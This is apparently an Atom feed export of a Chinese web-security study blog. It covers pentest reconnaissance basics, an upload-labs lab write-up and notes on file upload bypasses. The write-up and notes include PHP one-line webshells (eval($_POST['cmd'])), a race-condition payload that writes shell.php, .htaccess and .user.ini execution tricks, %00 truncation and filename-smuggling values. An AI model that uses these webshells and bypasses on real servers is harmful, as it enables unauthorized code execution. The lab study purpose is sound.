    <summary type="html">&lt;p&gt;​		一篇足矣：&lt;a href=&quot;https://xz.aliyun.com/t/3357#toc-0&quot;&gt;一篇文章带你深入理解漏洞之 XXE 漏洞&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;​		从 “四、我们能做什么” 开始看。&lt;/p&gt;
&lt;p&gt;​		关于漏洞检测，可以手动更改 Conten</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试基础入门</title>
    <link href="http://example.com/2024/02/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2024/02/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-02-26T05:43:10.535Z</updated>
    
    <content type="html"><![CDATA[<p>​ping <code> www.baidu.com</code> 这种大站时，给出来的 IP 一般不是真实 IP 。</p><p>​像百度这样的大厂一般会在全国各地架设 CDN（Content Delivery Network），即内容分发网络。</p><p>​CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。简言之就是既减少主机负担，又方便用户访问。CDN 的关键技术主要有内容存储和分发技术。</p><p>​显然如果你渗透的是 CDN 站而不是主站的话，是没有意义的。</p><hr><p>​web 的大致组成架构：网站源码、web 中间件、操作系统、数据库。</p><p>​web 安全研究的大致就是这几个方向。</p><hr><p>​信息搜集常用的搜索引擎语法：</p><ul><li><p><code>inurl</code> ，URL 存在关键字的网页。如搜索 <code>inurl:edu.cn</code> ，将返回 url 中存在 edu.cn 的结果。</p></li><li><p><code>site</code> ，指定域名。</p></li><li><p><code>intitle</code> ，标题中存在关键字的网页。</p></li><li><p><code>intext</code> ，正文中存在关键字的网页。如搜索 <code>intext:Powered by Discuz</code> ，可检索到一些用 Discuz CMS 构建的网站。</p></li><li><p><code>filetype</code> ，指定文件类型。</p></li></ul><p>​应用举例：<code>intitle:管理系统 filetype:php</code> ，查询标题含“管理系统”，且用 php 构建的网页。</p><hr><p>​域名搜集在渗透中的作用。</p><p>​举个例子，学院官网（computer.xxx.edu.cn）和学校官网（<a href="http://www.xxx.edu.cn),很明显只存在一个子域名不同的差别.由于二者的页面布局不一样,可能学院官网和学校官网用的是两套不一样的程序来构建的,但很可能两个域名解析到的是同一个/">www.xxx.edu.cn），很明显只存在一个子域名不同的差别。由于二者的页面布局不一样，可能学院官网和学校官网用的是两套不一样的程序来构建的，但很可能两个域名解析到的是同一个</a> IP 。事实就是这样，ping 一下就知道了。</p><p>​www 域名对应该 IP 的主页，computer 对应该 IP 的分页。如果我们授权对 <a href="http://www.xxx.edu.cn/">www.xxx.edu.cn</a> 进行渗透，但没找到突破口，而此时搜集到一个 computer 的域名，发现该域名与 www 共享一个 IP ，那么可以从 computer 对应的站找突破口。</p><p>​除了搜集子域名，还需要搜集域名后缀，如 .com、.org、.top 。可利用相关工具，或进行域名注册查询，根据如 xxx.com 的注册信息查询。</p><hr><p>​本地 hosts 。</p><p>​路径：C:\Windows\System32\drivers\etc\hosts</p><p>​作用：不管是访问网站，还是 <code>ping</code> 之类的，在进行 DNS 域名解析时，首先是在本地 hosts 文件里搜索，搜索不到再请求 DNS 服务器进行解析。假设在里面加上 <code>1.2.3.4 www.baidu.com</code> ，然后再 ping 一下，会发现域名解析成了 1.2.3.4 的 IP 。当然，此时会 ping 不通，访问 <a href="http://www.baidu.com/">www.baidu.com</a> 也会失败。</p><hr><p>​目录扫描工具原理：字典、发包、根据响应状态码判断目录。理论上自己可以写一个出来，关键在于字典。</p><p>​子域名扫描工具也是如此，但一般不好用，信息量大且无序，难以找到真正有用的一些域名。一种较好的办法是使用 Google ，搜索如 <code>site:baidu.com</code> ，然后选取前 10~20 页作为搜集内容。</p><hr><p>​有的程序判断你是 PC 端访问还是移动端访问，仅仅是通过 UA 头判断。“同一个用户只能投票一次”这种判断是不是同一个访问者，是通过 IP 地址判断。这些简单的判断，我们可以通过改 UA 、挂代理来绕过。</p><p>​APK 反编译、APP 抓包获得的网站，用 PC 端访问当然会出错（如显示 400 Bad Request），因为请求包不对，得改为手机端访问时的包格式。</p><hr><p>​在进行目录扫描的时候，扫 IP 地址比扫域名更好。有的网站在构建的时候，IP 地址与域名解析的目录是不一样的。通常 IP 地址对应的解析目录比域名更高一级，IP 地址解析的是根目录，这往往也是有的网站换做用 IP 地址访问时会显示禁止访问的原因。</p><hr><p>​IIS 网站安全设置：</p><ol><li>身份验证：<a href="https://www.cnblogs.com/WarBlog/p/11250865.html">https://www.cnblogs.com/WarBlog/p/11250865.html</a></li><li>IP 地址和域限制：设置指定 IP 和域名访问该网站的权限。</li></ol><hr><p>​0777 文件权限含义解析：</p><p>​文件权限通常是三位数字表示，这里的首位 0 表示的是十进制计数，所以实际的值是 777 。</p><p>​Linux 将用户分为 所有者(Owner)、组成员(Group)、其他(Other)、超级用户(Root) ，文件权限由用户的三种类型组成，每一位代表一种用户的权限：<code>[所有者][组成员][其他用户]</code> 。</p><p>​权限值由对应的描述计算得来，对应关系:</p><ul><li><code>r</code> → 4 可读</li><li><code>w</code> → 2 可写</li><li><code>x</code> → 1 可执行</li><li><code>-</code> → 0 无权限</li></ul><p>​所以 0777 权限含义为：所有者可读可写可执行，组成员可写可读可执行，其他用户可写可读可执行。</p><hr><p>​一般为了网站安全，上传目录会设置文件权限，如不可执行脚本，目的是防止上传限制被突破。此时上传脚本进来还是没用的，应该尝试把脚本传到其他具有可执行权限的目录里。</p><hr><p>​探测服务端 web 中间件类型，抓个包看响应头即可。</p><hr><p>​识别操作系统类型的方法：</p><ol><li><p>如果有网站，更改大小写访问如 <code>www.xxx.com/index.phP</code> 。如果正常，则是 Windows ，因为 Windows 对大小写不敏感。如果访问失败，则是 Linux 。</p></li><li><p>ping 一下看 TTL 。但由于 TTL 值可被修改且不能具体到操作系统的某个版本，所以一般不用。</p><blockquote><p>TTL（Time To Live，生存时间）是 IP 协议包中的一个值，当我们使用 Ping 命令时，本地计算机会向目的主机发送数据包，但是有的数据包会因为一些特殊的原因不能正常传送到目的主机，如果没有设置 TTL 值的话，数据包会一直在网络上面传送，浪费网络资源。数据包在传送的时候至少会经过一个以上的路由器，当数据包经过一个路由器的时候，TTL 就会自动减 1 ，如果减到 0 了还是没有传送到目的主机，那么这个数据包就会自动丢失。</p><p>例如：如果一个主机的 TTL 是64，当它经过 64 个路由器后还没有将数据包发送到目的主机的话，这个数据包就会自动丢弃。</p><p>常见操作系统的 TTL：</p><ul><li>WINDOWS NT&#x2F;2000  TTL：128</li><li>WINDOWS 95&#x2F;98   TTL：32</li><li>UNIX        TTL：255</li><li>LINUX       TTL：64</li><li>WIN7      TTL：64</li></ul></blockquote></li><li><p>nmap 扫描。</p></li></ol><hr><p>​识别数据库类型的方法：</p><ol><li>根据网站的构建语言推断，如果 PHP 常用 MySQL 。</li><li>nmap 扫描开放端口，通过端口识别数据库。<ul><li>MySQL：3306</li><li>Oracle：1521</li><li>SQL Server：1433</li><li>DB2：50000</li><li>PostgreSQL：5432</li><li>MongoDB：27017</li><li>pointbase：9092</li><li>Sybase：5000</li><li>Redis：6379</li><li>memcached：11211</li></ul></li></ol><hr><p>​越权，指越过该角色原有的权限，访问了没有授权的资源或信息。越权分为水平越权和垂直越权。</p><ul><li><p>水平越权：相同级别（权限）的用户或同一角色的不同用户之间的越权。</p></li><li><p>垂直越权：不同级别之间或不同角色之间的越权，又分为向上越权和向下越权。</p></li></ul><hr><p>​拖库，即数据库中数据的导出操作。</p><hr><p>​DoS 与 DDoS 。</p><p>​DoS 是拒绝服务（Denial of Service）的缩写，DDoS 是分布式拒绝服务（Distributed Denial of Service）的缩写。它是一种拒绝服务攻击的形式，与普通的 DoS 攻击不同，DDoS 攻击利用了分布在多个不同地点的多个计算机（或者被感染的设备）来同时向目标系统发送大量的请求，从而超出目标系统的处理能力，使其无法正常提供服务，导致服务不可用。</p><p>​DDoS 攻击的特点是攻击源点分布广泛，因此更具破坏性和难以应对。攻击者可以通过操纵大量被感染的计算机、利用僵尸网络或其他分布式方法，协调大规模的攻击。</p><p>​与传统的 DoS 攻击相比，DDoS 攻击更难以识别和防御，因为攻击流量来自多个不同的源点，常规的防御手段可能无法有效拦截所有恶意流量。防御 DDoS 攻击需要综合运用流量过滤、入侵检测系统、负载均衡、分布式防御系统等技术手段，以及协同网络服务提供商和安全专家的合作。</p><hr><p>​CC 攻击。</p><p>​CC 攻击是 DoS 攻击的一种形式，全称为“连接消耗”（Connection Consumption）攻击。在这种攻击中，攻击者通过向目标系统发送大量的连接请求，消耗目标系统的资源，使得正常用户无法访问或使用该系统的服务。</p><p>​CC 攻击通常是通过利用大量的虚假请求或无效的连接请求来占用目标系统的资源，例如网络带宽、CPU 和内存等。这些请求可能来自于恶意构造的程序或者被感染的计算机，也可能是通过利用漏洞或特定的网络工具发送的。</p><p>​CC 攻击的目的可能是多种多样的，包括对目标系统造成破坏、影响其正常运行、使其服务不可用，或者用作其他更复杂的攻击的一部分。</p><p>​为了应对 CC 攻击，网络管理员可以采取一系列的防御措施，包括使用防火墙、入侵检测系统（IDS）、入侵防御系统（IPS）等来过滤恶意流量，同时定期更新系统补丁以修补已知漏洞，以及使用流量限制和访问控制等方法来限制连接数量和频率。</p><hr><p>​0day 的含义是破解，是指一个软件或系统中存在的安全漏洞，而开发者还没有发布相应的补丁或修复程序。这意味着攻击者可以利用这个漏洞来进行攻击，因为开发者还没有意识到漏洞的存在或者尚未提供解决方案。</p><p>​0day漏洞通常是黑客或安全研究人员在软件或系统发布之前发现的。由于开发者还没有意识到漏洞的存在，所以被利用的时间窗口被称为“零日”（Zero-day）。一旦漏洞被开发者或安全研究人员发现，他们将开始开发并发布补丁来修复该漏洞，此时漏洞将不再是 0day 漏洞。</p><p>​在 Web 方面，比如某一开源 CMS 发布出来，被攻击者找到 0day 漏洞，但漏洞并没有公开，也没有提交给厂商，所以也就没有补丁。这种情况下使用 0day 攻击此系列的网站可以说是百发百中，使用这一 CMS 的所有用户都可能受波及。由此可见，用户量越大，0day 的威力越大。</p><hr><p>​exp，即 exploit，漏洞利用代码。</p><p>​poc ，漏洞验证代码。</p><p>​payload ，可以理解为 exp 是“大”，而 payload 是“小”。payload 也是 exp 的核心部分。</p><hr><p>​有时候某个 MD5 或其他的哈希值解不出，可能是因为它加了盐。</p><p>​在密码学中，通过在密码任意固定位置插入特定字符串，让散列后的结果和使用原始密码的散列结果不相符，这样一个过程我们称之为“加盐”。</p><p>​“盐值”是一组随机的字符串，被称为 Salt 。Salt 可以插在最前面、最后面，也可以插在中间，可分开插入也可倒序。</p><hr><p>​CMS（Content Management System）内容管理系统，主要是为了方便发布网络内容而存在的一体化 Web 管理系统。</p><p>​通常 CMS 有一个后台，登录后台进入一个可视化的操作界面，便可对网站进行一系列操作，比如发布内容、创建用户。</p><p>​若依就是一个 CMS 。</p><p>​用框架开发，叫一次开发。用 CMS 开发，叫二次开发。</p><hr><p>​文件 MD5 值的生成命令：<code>certutil -hashfile filename MD5</code> 。</p><hr><p>​如果还想玩玩用这个 CMS 建的站，可以搜：</p><ol><li><code>intext:Powered by xxx</code></li><li><code>inurl:该CMS的关键文件路径（不带文件名）</code></li></ol><hr><p>​写漏洞分析报告时，要清楚该漏洞涉及哪一层面：操作系统、网站源码（框架、CMS，还是自己写的）、中间件、数据库，还是第三方软件（如phpAdmin）。是否涉及权限，涉及什么权限，做好风险评估。</p><hr><p>​根据网站主要功能测漏洞，如：电商——交易、门户——综合、论坛——XSS 。</p><hr><p>​VPS（Virtual Private Server） 虚拟专用服务器技术，将一台服务器分割成多个虚拟专享服务器的技术。每个 VPS 可分配独立公网 IP 地址、独立操作系统、独立内存、独立 CPU 资源、独立执行程序和独立系统配置等。即相当于一台服务器被分割成多台虚拟机，每台虚拟机作为一个 VPS 供外界使用。</p><p>​拿租房来比喻，同样是租房子，有的房子是一套房子隔成很多间（VPS），每间都有厨房与卫生间，有的房子租的就是整套房子（云服务器）。　</p><p>　　VPS 的虚拟机运行于一台物理服务器之上，云服务器的虚拟机运行于物理服务器集群之上。</p><p>​云服务器就是一些实际的硬件设备，通过虚拟化技术，可以大规模统一调度，并当成一台机器的技术。你看不到它在哪里，看不到它的 CPU、内存、硬盘，但是你可以轻松把它当成一台现实中的主机来操作，无论是配置软件、测试性能、还是上传文件都和传统服务器没什么区别。</p><p>　　更重要的是云服务器可以动态平衡负载，当你的带宽、内存、硬盘不够用的时候，可以随时点击鼠标增加相应服务，通过弹性的调整，来实现满足各种变化的需求，同时还能控制成本，这就是云服务器最大的卖点。</p><p>　　VPS 是一台真实主机虚拟成多个小主机，性能往往得不到保障，而云服务器是数量庞大的服务器阵列，在均衡负载之后诞生很多虚拟主机，无论是数据安全还是性能都有基本的保证。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		ping &lt;code&gt; www.baidu.com&lt;/code&gt; 这种大站时，给出来的 IP 一般不是真实 IP 。&lt;/p&gt;
&lt;p&gt;​		像百度这样的大厂一般会在全国各地架设 CDN（Content Delivery Network），即内容分发网络。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs小记</title>
    <link href="http://example.com/2024/02/08/upload-labs/"/>
    <id>http://example.com/2024/02/08/upload-labs/</id>
    <published>2024-02-07T16:00:00.000Z</published>
    <updated>2024-02-08T07:20:09.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h1><p>​<em><strong>本篇 writeup 只针对部分关卡。</strong></em></p><p>​查看Apache版本（这只是其中的一个方法）：</p><p>​本地 upload-labs 使用的是 phpStudy 搭建的，但 phpStudy 操作面板里没有显示 Apache 版本。</p><p>​在 phpStudy 安装目录里找到 Apache&#x2F;bin&#x2F; 目录，在此打开 cmd 窗口，输入 <code>httpd -v</code> 即可，本地显示为 2.4.43 。</p><h1 id="Pass-01-客户端验证"><a href="#Pass-01-客户端验证" class="headerlink" title="Pass-01 客户端验证"></a>Pass-01 客户端验证</h1><p>​以下方法均可：</p><ol><li>禁用 JS 。</li><li>删除表单处的 onsubmit 。</li><li>本地先改为合法扩展名，抓包再改回去。</li></ol><h1 id="Pass-02-MIME类型验证"><a href="#Pass-02-MIME类型验证" class="headerlink" title="Pass-02 MIME类型验证"></a>Pass-02 MIME类型验证</h1><p>​抓包，修改 MIME 类型。建议改为 image&#x2F;gif ，方便打组合拳。</p><h1 id="Pass-03-Apache解析漏洞"><a href="#Pass-03-Apache解析漏洞" class="headerlink" title="Pass-03 Apache解析漏洞"></a>Pass-03 Apache解析漏洞</h1><p>​环境模拟：打开配置文件 httpd.conf，Ctrl+F 找到 <code>AddType application/x-httpd-php</code> 处，把 # 去掉，保存、重启。</p><p>​抓包，把扩展名改为 .phtml 即可。</p><p>​此配置信息是告诉 Apache 服务器，把扩展名是这几个的文件当 php 文件来解析，所以往里加 .abc 也一样当 php 来解析。其本身配置信息里只有 .php 和 .phtml，其他的如 .php1、.php3、.pht 什么的，除 ctf 外，实际情况下一般不会冒着风险往里加这些。</p><h1 id="Pass-04-htaccess"><a href="#Pass-04-htaccess" class="headerlink" title="Pass-04 .htaccess"></a>Pass-04 .htaccess</h1><p>​.htaccess 是一个配置文件，运行于 Apache 上，需要把 httpd.conf 里 AllowOverride 处全改为 All 才允许 Apache 启用 .htaccess 文件。此时，当 .htaccess 文件被放置在一个通过 Apache 加载的目录中时，.htaccess 文件会被 Apache 检测并执行，.htaccess 文件将覆盖  Apache 的原配置文件 httpd.conf 。注意，.htaccess 文件仅作用于所在目录及其子目录。</p><p>​环境模拟：更改 httpd.conf 相关设置，保存、重启。</p><p>​创建一个 .htaccess 文件，写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>​即让  Apache 把所有文件都当成 php 来解析，如果仅指定特定文件名当作 php 来解析，则写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;文件名&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>​下一步，先上传 .htaccess 文件，再上传图片马，然后访问图片马即可。</p><h1 id="Pass-05-user-ini"><a href="#Pass-05-user-ini" class="headerlink" title="Pass-05 .user.ini"></a>Pass-05 .user.ini</h1><p>​.ini 文件是 Windows 系统的配置文件，.user.ini 将覆盖 php 配置文件 php.ini，但 .user.ini 只能被 CGI&#x2F;FastCGI 处理。</p><p>​除了 php.ini 外，PHP 还会从被执行的 php&#x2F; 目录开始一直上升到 web 根目录扫描 .ini 文件。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。注意，同 .htaccess，.user.ini 只能用于访问其所在目录及子目录下的文件时进行覆盖。</p><p>​在 php.ini 文件中相关内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">; php.ini Options  ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Name for user-defined php.ini (.htaccess) files. Default is &quot;.user.ini&quot;</span><br><span class="line">;user_ini.filename = &quot;.user.ini&quot;</span><br><span class="line"></span><br><span class="line">; To disable this feature set this option to empty value</span><br><span class="line">;user_ini.filename =</span><br><span class="line"></span><br><span class="line">; TTL for user-defined php.ini files (time-to-live) in seconds. Default is 300 seconds (5 minutes)</span><br><span class="line">;user_ini.cache_ttl = 300</span><br></pre></td></tr></table></figure><p>​user_ini.filename 设定 PHP 在搜寻时的目标文件名，默认是 .user.ini ，如果都设定为空则不会搜寻。</p><p>​user_ini.cache_ttl 控制重新读取搜寻到的 .ini 文件的间隔时间，默认是 300 秒（5 分钟），可进行修改。</p><p>​.user.ini 解析成功需满足：</p><ol><li>服务器脚本语言为 PHP 。</li><li>服务器使用 CGI&#x2F;FastCGI 。</li><li>所在目录下要有可执行的 php 文件。</li></ol><p>​创建一个 .user.ini 文件，写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure><p>​什么意思，参考<a href="https://blog.csdn.net/fdipzone/article/details/39064001?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164934542916780271514234%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164934542916780271514234&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-39064001.142%5Ev7%5Econtrol,157%5Ev4%5Econtrol&utm_term=auto_prepend_file&spm=1018.2226.3001.4187">这篇文章</a> 。</p><p>​先上传 .user.ini 文件，再上传 test.jpg（图片马或纯 php 语句等都行），然后访问上传目录下的 readme.php 即可。注意，需要版本号后加有 -nts 的 php 版本才能成功解析 .user.ini ，因为只有加有 -nts 的 php 版本才使用 CGI&#x2F;FastCGI 。区分二者，可在 phpinfo 里 Ctrl+F 搜索 Zend Extension Build 或 PHP Extension Build ，里面有 TS 的为非 -nts 版本，有 NTS 的为 -nts 版本。</p><h1 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06 大小写绕过"></a>Pass-06 大小写绕过</h1><h1 id="Pass-07-空格绕过"><a href="#Pass-07-空格绕过" class="headerlink" title="Pass-07 空格绕过"></a>Pass-07 空格绕过</h1><h1 id="Pass-08-加点绕过"><a href="#Pass-08-加点绕过" class="headerlink" title="Pass-08 加点绕过"></a>Pass-08 加点绕过</h1><h1 id="Pass-09-DATA绕过"><a href="#Pass-09-DATA绕过" class="headerlink" title="Pass-09 ::$DATA绕过"></a>Pass-09 ::$DATA绕过</h1><p>​对于 Windows 系统，如果文件名后加 ::$DATA ，系统将不检查扩展名。将这样的文件上传到服务器后，由于 Windows 系统的特性，在磁盘中会忽略 ::$DATA 并将文件新建。 </p><h1 id="Pass-12-GET-00截断"><a href="#Pass-12-GET-00截断" class="headerlink" title="Pass-12 GET%00截断"></a>Pass-12 GET%00截断</h1><p>​php 解释器是 C 语言写的，C 语言中字符串结尾以 ASCII 码为 0 的字符 Null 为标志，其 url 编码为 %00 。</p><p>​php 的 %00 截断是 &lt;5.3.4 版本的一个漏洞，且需参数 magic_quotes_gpc 为 off 状态。如果为 on ，该字符会被加上一个反斜杠转义掉。</p><p>​环境模拟：在 phpStudy2018 操作面板的“其他选项菜单-&gt;php扩展及设置-&gt;参数开关设置”里找到 magic_quotes_gpc 并将其关闭。</p><p>​上传 info.php ，抓包做如下修改：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/upload-labs/1.png"></p><p>​可查看到上传后文件名为 info.php 。</p><p>​修改文件名为 info.png 、Content-Type 是为了绕过后端检测。将 save_path 修改后，后端 PHP 执行时流程如下：</p><p>​$file_ext 为 .png，成功通过白名单检测。$temp_file 为 info.png ，$img_path为 ..&#x2F;upload&#x2F;info.php%00&#x2F;xxx.png 。执行 <code>move_upload_file(info.png, ../upload/info.php%00/xxx.png)</code> 时，将触发 %00 截断漏洞，保存文件名时 %00 后的会被全部忽略，最终为 ..&#x2F;upload&#x2F;info.php 。</p><p>​可见靠拼接的上传路径并不安全。</p><h1 id="Pass-13-POST-00截断"><a href="#Pass-13-POST-00截断" class="headerlink" title="Pass-13 POST%00截断"></a>Pass-13 POST%00截断</h1><p>​与上题类似，只不过 save_path 是通过 POST 传递的。因为 POST 传数据时用的不是 url 编码，所以这里改的地方有所不同。</p><p>​抓包，更改这些地方：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/upload-labs/2.png"></p><p>​在 info.php 后需要加一个字符占 Null 的位置，然后在 Hex 里找到该字符对应的编码（如%是25），将其改为 00 再发包即可：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/upload-labs/3.png"></p><p>​可查看到上传后文件名为 info.php 。</p><h1 id="Pass-14-文件幻术绕过"><a href="#Pass-14-文件幻术绕过" class="headerlink" title="Pass-14 文件幻术绕过"></a>Pass-14 文件幻术绕过</h1><p>​本关没用 getimagesize 函数，所以这样绕可行。</p><p>​PHP 检查图片文件的格式是通过检查文件开头的一段二进制值，这段二进制值称为文件幻术。文件上传绕过一般用 GIF 的文件幻术 <code>GIF89a</code> 。</p><h1 id="Pass-15-图片马绕过"><a href="#Pass-15-图片马绕过" class="headerlink" title="Pass-15 图片马绕过"></a>Pass-15 图片马绕过</h1><p>​本关使用了 getimagesize 函数，只能靠图片马绕过。</p><h1 id="Pass-16-图片马绕过"><a href="#Pass-16-图片马绕过" class="headerlink" title="Pass-16 图片马绕过"></a>Pass-16 图片马绕过</h1><p>​本关没用 getimagesize 函数，但有 exif_imagetype 函数，也只能靠图片马绕过。</p><h1 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17 二次渲染"></a>Pass-17 二次渲染</h1><p>​二次渲染就是后端重写图片文件的内容，imagecreatefromgif 函数这是进行二次渲染的核心函数。</p><p>​imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像。</p><p>​imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像。</p><p>​imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像。</p><p>​如何绕过？参考<a href="https://xz.aliyun.com/t/2657#toc-1">这篇文章</a>。</p><p>​一般的图片马里，php 语句都放在最后面，而经过二次渲染后，末尾的 php 语句将被擦除，所以将 php 语句放在中间即可，但注意放的位置不当将导致图片无法显示。</p><h1 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h1><p>​查看源码发现它会先将文件保存再检查后缀，如果后缀不符合则删除文件。前后两步的执行是存在一定时间间隔的，而如果能卡在这段时间做一些动作，那就能成功上传 php 文件。</p><p>​创建 test.php ，写入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>), <span class="string">&#x27;&lt;?php phpinfo(); eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]; ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​上传抓包，将包送到 Intruder 板块进行无字典无限次爆破：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/upload-labs/4.png"></p><p>​访问 test.php ，同样地抓包进行无字典无限次爆破。接下来两个爆破组同时进行 Start attack ，等待跑出 200 状态码即可。</p><p>​通过无限次发包 test.php 创造机会，同时无限次访问 test.php ，如果有一刻刚好在间隔时间里成功访问到了 test.php ，那么将会执行 test.php ——在同目录下创建 shell.php 并写入 <code>&lt;?php phpinfo(); eval($_POST[&#39;cmd&#39;]; ?&gt;</code> ，条件竞争便可绕过，不过这是一个概率事件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h1&gt;&lt;p&gt;​		&lt;em&gt;&lt;strong&gt;本篇 writeup 只针对部分关卡。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;​		查看A</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞学习</title>
    <link href="http://example.com/2024/02/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2024/02/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2024-02-07T16:00:00.000Z</published>
    <updated>2024-02-08T10:09:21.935Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>建议结合 upload-labs 笔记一起看</strong></em></p><h1 id="常见突破方式"><a href="#常见突破方式" class="headerlink" title="常见突破方式"></a>常见突破方式</h1><h2 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h2><ol><li>禁用 js 。</li><li>删除、更改 js 或 js 的触发条件。</li></ol><h2 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h2><p>​抓包，改 Content-Type 。建议改为 image&#x2F;gif，方便打组合拳。</p><h2 id="服务端扩展名黑名单"><a href="#服务端扩展名黑名单" class="headerlink" title="服务端扩展名黑名单"></a>服务端扩展名黑名单</h2><ol><li><p>抓住 Windows 的特点：</p><ul><li>对大小写不敏感</li><li>自动去除扩展名末尾的空格、点、::$DATA</li></ul><p>限制：<code>php-版本号-nts+Apache</code> 无法解析。</p></li><li><p>抓住 PHP 的特点：</p><ul><li>&lt;5.3.4 版本存在 00 截断漏洞</li><li>user.ini 可覆盖 php.ini</li><li>move_upload_file 函数会忽略扩展名末尾的 <code>/.</code></li></ul></li><li><p>抓住 Apache 的特点：</p><ul><li>.phtml、.php2、.php3、.php5、.pht 等可做为 .php 解析，但需要配置文件进行针对性修改</li><li>.htaccess 文件可覆盖 Apache 配置文件 httpd.conf，也需要配置文件进行针对性修改</li></ul></li><li><p>分号截断。修改为如 <code>filename=&quot;1.jpg;.php&quot;</code> ，有一些 waf 遇 <code>;</code> 会识别为请求字段的结束，从而忽略 <code>;</code> 后面的内容。</p></li><li><p>换行。修改为如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1.p</span><br><span class="line">h</span><br><span class="line">p&quot;</span><br></pre></td></tr></table></figure><p>换行符会在后端程序中自动转换为 <code>\n</code> ，则 filename 的值为 <code>1.p\nh\np</code> ，从而绕过 waf 。</p><p>在 Windows 中，这里的换行符会自动去掉，最终文件名还是 <code>1.php</code> 。</p></li></ol><h2 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h2><blockquote><p>PHP 一句话木马：<code>&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt;</code></p></blockquote><ol><li><p>图片马绕过。制作：执行命令 <code>copy/b 图片名+文件名 图片马名</code> 